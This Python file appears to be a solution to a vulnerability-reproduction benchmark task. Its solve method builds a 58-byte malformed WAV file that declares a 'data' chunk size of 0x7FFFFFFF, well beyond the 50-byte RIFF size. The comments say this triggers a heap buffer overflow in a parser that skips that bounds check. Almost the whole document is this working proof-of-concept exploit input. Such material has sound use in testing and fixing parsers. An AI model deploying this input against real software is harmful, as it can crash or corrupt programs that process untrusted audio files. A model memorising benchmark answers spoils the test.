import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        Target: Heap Buffer Overflow due to missing check of data size against RIFF chunk end.
        We construct a WAV file where the RIFF header specifies a small size (consistent with file),
        but an internal 'data' chunk specifies a very large size.
        """
        
        # 1. RIFF Header (12 bytes)
        # 'RIFF' signature
        riff_sig = b'RIFF'
        # RIFF chunk size: 50 bytes (Total file size 58 - 8 bytes header)
        # This allocates a buffer of roughly this size in memory.
        riff_size = struct.pack('<I', 50)
        # 'WAVE' format
        wave_sig = b'WAVE'
        
        # 2. fmt Chunk (24 bytes)
        # 'fmt ' signature
        fmt_sig = b'fmt '
        # Chunk size: 16 bytes for standard PCM
        fmt_len = struct.pack('<I', 16)
        # PCM Format (1), 1 Channel, 44100 Hz, 44100 ByteRate, 1 BlockAlign, 8 BitsPerSample
        fmt_data = struct.pack('<HHIIHH', 1, 1, 44100, 44100, 1, 8)
        
        # 3. data Chunk Header (8 bytes)
        # 'data' signature
        data_sig = b'data'
        # Chunk size: Set to a large value (0x7FFFFFFF) to trigger the overflow.
        # The parser will attempt to read this many bytes, but the buffer/file ends much sooner.
        # The vulnerability is that this size is not checked against the containing RIFF chunk size (50).
        data_len = struct.pack('<I', 0x7FFFFFFF)
        
        # 4. Payload (14 bytes)
        # Fill the remaining bytes to reach the ground-truth length of 58 bytes.
        # (12 + 24 + 8 = 44 bytes used so far. 58 - 44 = 14 bytes remaining)
        payload = b'\x00' * 14
        
        return riff_sig + riff_size + wave_sig + fmt_sig + fmt_len + fmt_data + data_sig + data_len + payload
